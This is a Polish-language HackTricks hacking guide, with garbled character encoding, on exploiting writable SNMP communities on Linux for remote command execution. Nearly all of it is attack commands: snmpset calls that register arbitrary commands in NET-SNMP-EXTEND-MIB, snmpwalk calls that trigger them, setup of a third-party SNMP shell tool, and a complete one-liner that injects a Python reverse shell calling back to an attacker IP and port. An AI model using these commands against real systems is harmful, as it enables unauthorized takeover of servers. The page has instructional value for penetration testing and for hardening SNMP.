{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# SNMP RCE

SNMP moÅ¼e byÄ‡ wykorzystane przez atakujÄ…cego, jeÅ›li administrator zignoruje jego domyÅ›lnÄ… konfiguracjÄ™ na urzÄ…dzeniu lub serwerze. Poprzez **naduÅ¼ycie spoÅ‚ecznoÅ›ci SNMP z uprawnieniami do zapisu (rwcommunity)** na systemie operacyjnym Linux, atakujÄ…cy moÅ¼e wykonywaÄ‡ polecenia na serwerze.

## Rozszerzanie usÅ‚ug o dodatkowe polecenia

Aby rozszerzyÄ‡ usÅ‚ugi SNMP i dodaÄ‡ dodatkowe polecenia, moÅ¼liwe jest dodanie nowych **wierszy do tabeli "nsExtendObjects"**. MoÅ¼na to osiÄ…gnÄ…Ä‡, uÅ¼ywajÄ…c polecenia `snmpset` i podajÄ…c niezbÄ™dne parametry, w tym absolutnÄ… Å›cieÅ¼kÄ™ do pliku wykonywalnego oraz polecenie do wykonania:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Wstrzykiwanie poleceÅ„ do wykonania

Wstrzykiwanie poleceÅ„ do uruchomienia na usÅ‚udze SNMP wymaga istnienia i moÅ¼liwoÅ›ci wykonania wywoÅ‚ywanego binarnego/skryptu. **`NET-SNMP-EXTEND-MIB`** nakÅ‚ada obowiÄ…zek podania absolutnej Å›cieÅ¼ki do pliku wykonywalnego.

Aby potwierdziÄ‡ wykonanie wstrzykniÄ™tego polecenia, moÅ¼na uÅ¼yÄ‡ polecenia `snmpwalk`, aby wyliczyÄ‡ usÅ‚ugÄ™ SNMP. **wynik wyÅ›wietli polecenie i jego powiÄ…zane szczegÃ³Å‚y**, w tym absolutnÄ… Å›cieÅ¼kÄ™:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Uruchamianie WstrzykniÄ™tych Komend

Gdy **wstrzykniÄ™ta komenda jest odczytywana, jest wykonywana**. To zachowanie jest znane jako **`run-on-read()`**. Wykonanie komendy moÅ¼na zaobserwowaÄ‡ podczas odczytu snmpwalk.

### Uzyskiwanie PowÅ‚oki Serwera za pomocÄ… SNMP

Aby uzyskaÄ‡ kontrolÄ™ nad serwerem i zdobyÄ‡ powÅ‚okÄ™ serwera, moÅ¼na wykorzystaÄ‡ skrypt Pythona opracowany przez mxrch z [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git).

Alternatywnie, powÅ‚okÄ™ odwrotnÄ… moÅ¼na rÄ™cznie stworzyÄ‡, wstrzykujÄ…c konkretnÄ… komendÄ™ do SNMP. Ta komenda, uruchamiana przez snmpwalk, nawiÄ…zuje poÅ‚Ä…czenie powÅ‚oki odwrotnej z maszynÄ… atakujÄ…cego, umoÅ¼liwiajÄ…c kontrolÄ™ nad maszynÄ… ofiary. MoÅ¼esz zainstalowaÄ‡ wymagane elementy do uruchomienia tego:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Lub odwrotna powÅ‚oka:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Odniesienia
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
